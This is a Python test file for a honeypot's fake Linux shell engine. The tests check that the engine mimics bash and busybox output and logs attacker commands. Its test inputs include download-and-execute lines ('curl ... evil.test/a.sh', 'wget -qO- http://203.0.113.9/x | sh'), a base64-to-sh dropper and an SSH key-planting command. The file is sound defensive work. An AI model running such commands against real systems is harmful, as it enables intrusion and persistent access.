import dataclasses

from honeypot.core.engine import InteractionEngine
from honeypot.core.persona import get_persona
from honeypot.core.session import SessionState


"""
These tests focus on InteractionEngine, the fake shell brain.
They call engine.process() directly, so they are fast and do not need sockets.
"""


def create_session():
    """Create a default generic_linux session for simple command tests."""
    return SessionState(("127.0.0.1", 4444))


def test_banner():
    """The first text a visitor sees should include OS text and a prompt."""
    engine = InteractionEngine()
    session = create_session()

    banner = engine.build_banner(session)

    assert "Linux" in banner
    assert "root@ip-10-0-0-12:/home/admin# " in banner


def test_whoami():
    """whoami should return the username exposed by the active persona."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("whoami", session)

    assert "root" in response


def test_pwd():
    """pwd should show the session's current fake directory."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("pwd", session)

    assert "/home/admin" in response


def test_cd_into_known_directory_updates_cwd_and_prints_nothing():
    """A successful cd is silent, matching real bash, and moves session.cwd.

    Targets /home, not /home/admin -- session.cwd already starts at
    /home/admin (the persona's home_dir), so cd'ing there wouldn't actually
    exercise a move; the assertion would pass even if cd were a no-op."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("cd /home", session)

    assert session.cwd == "/home"
    assert response == session.prompt()


def test_cd_dotdot_moves_up_one_directory():
    engine = InteractionEngine()
    session = create_session()

    engine.process("cd /home/admin", session)
    engine.process("cd ..", session)

    assert session.cwd == "/home"


def test_cd_with_no_args_goes_home():
    engine = InteractionEngine()
    session = create_session()

    engine.process("cd /home", session)
    response = engine.process("cd", session)

    assert session.cwd == session.persona.home_dir
    assert response == session.prompt()


def test_cd_into_unknown_path_reports_bash_style_error():
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("cd /nope", session)

    assert "bash: cd: /nope: No such file or directory" in response
    assert session.cwd == session.persona.home_dir


def test_cd_into_a_file_reports_not_a_directory():
    """cd on a path that resolves to a known file (not a directory) should
    say "Not a directory", matching real bash's distinct error for that case."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("cd /etc/passwd", session)

    assert "bash: cd: /etc/passwd: Not a directory" in response
    assert session.cwd == session.persona.home_dir


def test_cd_with_multiple_operands_is_rejected():
    """Real bash refuses cd with more than one argument instead of silently
    using the first and ignoring the rest."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("cd /home /etc", session)

    assert "bash: cd: too many arguments" in response
    assert session.cwd == session.persona.home_dir


def test_unknown_command():
    """Unknown commands should look like normal bash command-not-found errors."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("abcdef", session)

    assert "command not found" in response


def test_exit():
    """exit is represented internally by a close signal for the shell's caller."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("exit", session)

    assert response == "__CLOSE__"


def test_cat_existing_file():
    """cat should read files from the session's fake filesystem."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process(
        "cat /etc/passwd",
        session
    )

    assert "root:x:0:0" in response


def test_cat_missing_file():
    """cat should return a believable missing-file error for unknown paths."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process(
        "cat /fake/file",
        session
    )

    assert "No such file" in response
    assert session.decoy_files_surfaced == []


def test_cat_existing_file_records_surfaced_decoy_once():
    """Successful file reads should preserve persona-aware exposure context."""
    engine = InteractionEngine()
    session = create_session()

    engine.process("cat /etc/passwd", session)
    engine.process("cat /etc/passwd", session)

    assert session.decoy_files_surfaced == ["/etc/passwd"]


def test_engine_uses_persona_identity_and_environment():
    """A non-default persona should change identity, processes, and ports."""
    engine = InteractionEngine()
    session = SessionState(
        ("127.0.0.1", 4444),
        persona=get_persona("ubuntu_web_server"),
    )

    banner = engine.build_banner(session)
    uname = engine.process("uname -a", session)
    hostname = engine.process("hostname", session)
    whoami = engine.process("whoami", session)
    processes = engine.process("ps", session)
    ports = engine.process("netstat -tulpn", session)

    assert "Ubuntu 20.04.6 LTS" in banner
    assert "web-prod-01" in uname
    assert "web-prod-01" in hostname
    assert "ubuntu" in whoami
    assert "nginx" in processes
    assert "0.0.0.0:443" in ports
    assert "ubuntu@web-prod-01:/home/ubuntu$ " in banner


def test_prompt_uses_dollar_sign_for_a_non_root_persona():
    """Bash's own convention: a "#" prompt implies root -- a non-root persona
    (eg. ubuntu_web_server) must not get one, or the prompt would contradict
    what `whoami`/`id` already report for that session."""
    session = SessionState(
        ("127.0.0.1", 4444),
        persona=get_persona("ubuntu_web_server"),
    )

    assert session.prompt() == "ubuntu@web-prod-01:/home/ubuntu$ "


def test_engine_lists_persona_filesystem_paths():
    """ls should build directory listings from the selected persona's files."""
    engine = InteractionEngine()
    session = SessionState(
        ("127.0.0.1", 4444),
        persona=get_persona("ubuntu_web_server"),
    )

    response = engine.process("ls /var/www/html", session)

    assert "index.php" in response
    assert "wp-config.php" in response
    assert session.decoy_files_surfaced == [
        "/var/www/html/index.php",
        "/var/www/html/wp-config.php",
    ]


def test_engine_normalizes_cat_paths():
    """cat should resolve shell-style path components before lookup."""
    engine = InteractionEngine()
    session = create_session()

    parent_path = engine.process("cat /home/admin/../admin/notes.txt", session)
    slash_path = engine.process("cat /home//admin/./notes.txt", session)
    home_path = engine.process("cat ~/notes.txt", session)

    assert "TODO: rotate credentials" in parent_path
    assert "TODO: rotate credentials" in slash_path
    assert "TODO: rotate credentials" in home_path


def test_engine_normalizes_ls_paths_without_escaping_root():
    """Path traversal should collapse at fake root, like a normal Linux path."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("ls /../../etc", session)

    assert "hosts" in response
    assert "passwd" in response


def test_help_is_bash_builtin_help_not_a_command_menu():
    """A list of "available commands" would announce a fake shell."""
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("help", session)

    assert response.startswith("GNU bash, version")
    assert "Available commands" not in response


def test_question_mark_is_not_a_command():
    engine = InteractionEngine()
    session = create_session()

    assert "bash: ?: command not found" in engine.process("?", session)


def test_id_matches_a_non_root_persona():
    """id must agree with whoami and the "$" prompt."""
    engine = InteractionEngine()
    session = SessionState(
        ("127.0.0.1", 4444),
        persona=get_persona("ubuntu_web_server"),
    )

    response = engine.process("id", session)

    assert response.startswith("uid=1000(ubuntu) gid=1000(ubuntu)")
    assert "root" not in response.split("\n")[0]


def test_uname_without_flags_prints_kernel_name():
    engine = InteractionEngine()
    session = create_session()

    assert engine.process("uname", session) == "Linux\n" + session.prompt()


def test_uname_flags_are_answered_from_the_persona():
    engine = InteractionEngine()
    session = create_session()

    assert engine.process("uname -r", session).startswith("5.15.0-91-generic\n")
    assert engine.process("uname -m", session).startswith("x86_64\n")
    assert engine.process("uname -snrm", session).startswith(
        "Linux ip-10-0-0-12 5.15.0-91-generic x86_64\n"
    )
    assert engine.process("uname --all", session).startswith(session.persona.uname_output)


def test_uname_rejects_unknown_option_like_coreutils():
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("uname -x", session)

    assert "uname: invalid option -- 'x'" in response


def test_wget_fails_on_dns_without_downloading():
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("wget http://example.com/x.sh", session)

    assert "wget: unable to resolve host address 'example.com'" in response
    assert "command not found" not in response
    assert session.commands[-1]["cmd"] == "wget http://example.com/x.sh"


def test_curl_fails_on_dns_without_downloading():
    engine = InteractionEngine()
    session = create_session()

    response = engine.process("curl -fsSL https://evil.test/a.sh", session)

    assert "curl: (6) Could not resolve host: evil.test" in response


def test_cat_on_a_directory_says_is_a_directory():
    engine = InteractionEngine()
    session = create_session()

    assert "cat: /etc: Is a directory" in engine.process("cat /etc", session)


def test_errors_echo_the_operand_as_typed():
    """Real cat/ls/cd print the path the user typed, not a resolved one."""
    engine = InteractionEngine()
    session = create_session()

    assert "cat: nope: No such file or directory" in engine.process("cat nope", session)
    assert "ls: cannot access 'nope'" in engine.process("ls nope", session)
    assert "bash: cd: nope: No such file or directory" in engine.process("cd nope", session)


def test_echo_answers_the_login_checks_bots_send():
    """The three checks seen most often right after an SSH login."""
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    assert engine.process(r'echo -e "\x6F\x6B"', session) == f"ok\n{prompt}"
    assert engine.process("echo OK", session) == f"OK\n{prompt}"
    assert engine.process("echo -n login_success", session) == f"login_success{prompt}"


def test_echo_handles_options_and_escapes_like_bash():
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    # Without -e, backslashes are printed as typed
    assert engine.process(r'echo "a\tb"', session) == f"a\\tb\n{prompt}"
    assert engine.process(r'echo -e "a\tb\n"', session) == f"a\tb\n\n{prompt}"
    assert engine.process(r'echo -ne "\0101\u00e9"', session) == f"Aé{prompt}"
    assert engine.process(r'echo -e "stop\cnot shown"', session) == f"stop{prompt}"
    assert engine.process(r'echo -e "\x"', session) == f"\\x\n{prompt}"
    # Not an option: printed as text
    assert engine.process("echo -x hi", session) == f"-x hi\n{prompt}"
    assert engine.process("echo", session) == f"\n{prompt}"
    assert engine.process("/bin/echo hi", session) == f"hi\n{prompt}"


def test_echo_into_a_file_or_pipe_prints_nothing():
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    assert engine.process("echo ssh-rsa AAAA >> .ssh/authorized_keys", session) == prompt
    assert engine.process("echo aGk= | base64 -d", session) == f"hi{prompt}"
    assert engine.process("echo hi 2>/dev/null", session) == f"hi\n{prompt}"
    assert session.commands[-1]["cmd"] == "echo hi 2>/dev/null"


def test_banner_last_login_is_not_a_fixed_placeholder():
    engine = InteractionEngine()
    session = create_session()

    banner = engine.build_banner(session)

    assert "from unknown" not in banner
    assert "Last login: " in banner


def test_commands_on_one_line_run_in_order_and_log_once():
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    response = engine.process("echo OK; whoami", session)

    assert response == f"OK\nroot\n{prompt}"
    assert [c["cmd"] for c in session.commands] == ["echo OK; whoami"]


def test_and_or_run_the_next_command_only_on_success_or_failure():
    engine = InteractionEngine()
    session = create_session()

    # The prompt shows the directory, so read it after the cd
    response = engine.process("cd /bin && pwd", session)
    assert response == f"/bin\n{session.prompt()}"
    prompt = session.prompt()
    assert engine.process("cd /nope && pwd", session) == (
        f"bash: cd: /nope: No such file or directory\n{prompt}"
    )
    assert engine.process("cd /nope || echo fallback", session).endswith(f"fallback\n{prompt}")
    assert engine.process("echo a || echo b", session) == f"a\n{prompt}"
    # A failed download stops a `wget ... && chmod +x ...` chain
    response = engine.process("wget http://203.0.113.9/x && ./x", session)
    assert "unable to resolve host" in response
    assert "./x" not in response


def test_separators_inside_quotes_are_text():
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    assert engine.process('echo "a; b && c"', session) == f"a; b && c\n{prompt}"
    assert engine.process(r"echo a\;b", session) == f"a;b\n{prompt}"


def test_a_separator_with_no_command_is_a_syntax_error():
    engine = InteractionEngine()
    session = create_session()

    assert "syntax error near unexpected token `;'" in engine.process("; ls", session)
    assert "syntax error near unexpected token `;;'" in engine.process("echo a;;", session)
    assert engine.process("echo a;", session) == f"a\n{session.prompt()}"


def test_exit_after_output_keeps_the_output_and_closes():
    engine = InteractionEngine()
    session = create_session()

    assert engine.process("echo bye; exit; whoami", session) == "bye\n__CLOSE__"


def test_cat_of_a_system_program_prints_a_header_for_the_persona_cpu():
    """A loader reads bytes 4, 5 and 18 to pick the build to download."""
    engine = InteractionEngine()
    session = create_session()

    output = engine.process("cat /bin/echo", session).removesuffix(session.prompt())
    # The bytes the SSH channel sends (it encodes with surrogateescape)
    header = output.encode("utf-8", "surrogateescape")

    assert header[:4] == b"\x7fELF"
    assert header[4] == 2  # 64-bit
    assert header[5] == 1  # little-endian
    assert header[18] == 0x3E  # x86_64
    assert engine.process("cat /usr/bin/echo", session).startswith("\x7fELF")


def test_cat_of_a_system_program_on_an_arm64_persona_carries_the_raw_cpu_byte():
    """0xB7 isn't valid UTF-8 on its own; it must still arrive as one byte."""
    engine = InteractionEngine()
    persona = dataclasses.replace(
        get_persona("generic_linux"),
        uname_output="Linux pi 6.1.0-rpi7 #1 SMP aarch64 GNU/Linux",
    )
    session = SessionState(("127.0.0.1", 4444), persona=persona)

    output = engine.process("cat /bin/echo", session).removesuffix(session.prompt())
    header = output.encode("utf-8", "surrogateescape")

    assert header[4] == 2
    assert header[18:20] == b"\xb7\x00"


def test_cat_of_a_system_program_on_a_mips_router_says_mips():
    engine = InteractionEngine()
    session = SessionState(("127.0.0.1", 4444), persona=get_persona("busybox_router"))

    header = engine.process("/bin/busybox cat /bin/echo", session)

    assert header[:4] == "\x7fELF"
    assert header[4] == "\x01"  # 32-bit
    assert header[5] == "\x02"  # big-endian
    assert header[19] == "\x08"  # MIPS, high byte first


def test_programs_by_full_path_and_busybox_applets():
    engine = InteractionEngine()
    router = SessionState(("127.0.0.1", 4444), persona=get_persona("busybox_router"))
    server = create_session()

    assert engine.process("/usr/bin/whoami", server).startswith("root\n")
    assert engine.process("/bin/busybox echo hi", server).startswith(
        "bash: /bin/busybox: No such file or directory"
    )
    assert engine.process("./bot", server).startswith("bash: ./bot: No such file or directory")
    assert engine.process("busybox ECCHI", router).startswith("ECCHI: applet not found")
    assert engine.process("busybox echo hi", router).startswith("hi\n")


def test_bin_directories_list_the_programs():
    engine = InteractionEngine()
    session = create_session()

    assert "echo" in engine.process("ls /bin", session)
    assert "usr" in engine.process("ls /", session)
    assert "cat: /usr/bin: Is a directory" in engine.process("cat /usr/bin", session)
    assert "Not a directory" in engine.process("cd /bin/echo", session)


def test_pipes_feed_each_command_the_previous_output():
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    assert engine.process("echo hello | cat", session) == f"hello\n{prompt}"
    assert engine.process("cat /etc/passwd | grep root | wc -l", session) == f"1\n{prompt}"
    assert engine.process("cat /etc/passwd | head -n 1", session).startswith("root:")
    assert engine.process("echo 'a|b'", session) == f"a|b\n{prompt}"
    assert engine.process("echo hi | grep -c zzz", session) == f"0\n{prompt}"
    assert engine.process("echo hi | grep -v zzz", session) == f"hi\n{prompt}"


def test_errors_inside_a_pipeline_go_to_the_screen_not_down_the_pipe():
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    assert engine.process("nosuch | wc -l", session) == (
        f"bash: nosuch: command not found\n0\n{prompt}"
    )
    assert "syntax error near unexpected token `|'" in engine.process("| ls", session)


def test_piped_scripts_run_through_the_fake_shell():
    """`echo <base64> | base64 -d | sh` is how many droppers hide their
    commands; the decoded commands get the same fake answers."""
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    # "whoami\nid\n" in base64
    response = engine.process("echo d2hvYW1pCmlkCg== | base64 -d | sh", session)
    assert response == f"root\nuid=0(root) gid=0(root) groups=0(root)\n{prompt}"
    assert engine.process("sh -c 'echo a; echo b'", session) == f"a\nb\n{prompt}"
    # exit inside a subshell or pipeline doesn't end the login
    assert engine.process("sh -c exit", session) == prompt
    assert engine.process("echo hi | exit", session) == prompt
    assert engine.process("echo hi | base64", session) == f"aGkK\n{prompt}"
    assert engine.process("echo '!!' | base64 -d", session) == f"base64: invalid input\n{prompt}"


def test_quiet_downloads_print_nothing_and_options_values_are_not_urls():
    engine = InteractionEngine()
    session = create_session()
    prompt = session.prompt()

    assert engine.process("wget -qO- http://203.0.113.9/x | sh", session) == prompt
    assert engine.process("curl -s http://203.0.113.9/x | sh", session) == prompt
    assert "Could not resolve host: 203.0.113.9" in engine.process(
        "curl -fsSL http://203.0.113.9/x", session
    )
    assert "unable to resolve host address '203.0.113.9'" in engine.process(
        "wget -O /tmp/x http://203.0.113.9/x", session
    )


def test_busybox_router_errors_use_busybox_wording():
    engine = InteractionEngine()
    session = SessionState(("127.0.0.1", 4444), persona=get_persona("busybox_router"))

    assert engine.process("nosuch", session).startswith("-sh: nosuch: not found\n")
    assert engine.process("/tmp/bot", session).startswith("-sh: /tmp/bot: not found\n")
    assert engine.process("cd /nope", session).startswith(
        "-sh: cd: can't cd to /nope: No such file or directory\n"
    )
    assert engine.process("cat nope", session).startswith(
        "cat: can't open 'nope': No such file or directory\n"
    )
    assert engine.process("cat /etc", session).startswith("cat: read error: Is a directory\n")
    assert engine.process("ls /nope", session).startswith("ls: /nope: No such file or directory\n")
    assert engine.process("wget http://203.0.113.9/x", session).startswith(
        "wget: bad address '203.0.113.9'\n"
    )
    assert engine.process("; ls", session).startswith('-sh: syntax error: unexpected ";"\n')
    assert engine.process("curl http://203.0.113.9/x", session).startswith("-sh: curl: not found\n")


def test_invalid_utf8_in_a_command_is_logged_as_visible_text():
    engine = InteractionEngine()
    session = create_session()

    engine.process("echo \udcff", session)

    assert session.commands[-1]["cmd"] == "echo \\xff"
